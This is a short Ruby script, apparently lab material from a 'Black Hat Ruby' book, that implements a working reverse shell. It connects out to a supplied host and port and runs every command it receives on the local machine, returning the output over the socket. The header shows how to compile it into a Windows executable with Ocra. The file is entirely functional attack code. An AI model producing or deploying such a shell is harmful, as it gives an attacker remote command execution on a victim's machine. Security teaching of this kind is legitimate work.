#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Simple Ruby reverse shell to be compiled using Ocra
#   - To compile this script using ocra:
#   c:\ ocra --console .\rshell.rb --
# Requirements:
#   - Requires Windows
#   gem install ocra
#
require 'socket'

host     = ARGV[0] || 'localhost'
port     = ARGV[1] || 9911
hostname = `hostname`.chomp

exit if defined?(Ocra) # To prevent ocra from getting in the loop and never exit

s = TCPSocket.open(host, port)
begin
  loop do
    s.print "#{hostname})> "
    cmd = s.gets.chomp
    IO.popen(cmd, 'rb', :err=>[:child, :out]) {|io| s.print(io.read)} unless cmd.empty?
  end
rescue Errno::ENOENT
  retry
rescue Exception => e
  puts e.full_message
  exit!
end
